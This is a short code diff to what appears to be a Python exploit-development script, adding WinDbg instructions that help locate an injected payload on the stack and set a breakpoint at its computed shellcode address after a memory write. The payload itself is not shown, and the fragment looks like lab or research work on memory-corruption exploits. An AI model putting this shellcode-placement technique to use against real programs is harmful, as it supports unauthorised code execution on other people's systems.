@@ -101,7 +101,17 @@ def main() -> bool:
     print(f"payload: {payload}")
 
     write_mem(payload)
-    print("payload write")
+    print("payload written")
+    print(f"[WinDbg] attach to exe")
+    print(f"[WinDbg] ~0s")
+    print(f"[WinDbg] k  (-> find func frame number)")
+    print(f"[WinDbg] ? <func's child ebp>")
+    print(f"[WinDbg] dps <func's child ebp>-90 L40")
+    print(f"[WinDbg] expected content_address: 0x{content_address:x}")
+    print(
+        f"[WinDbg] bp {content_address + padding_size + 4*6:#010x}  (shellcode address)"
+    )
+    print(f"[WinDbg] g")
     input("Press Enter to continue...")
 
     cmd()
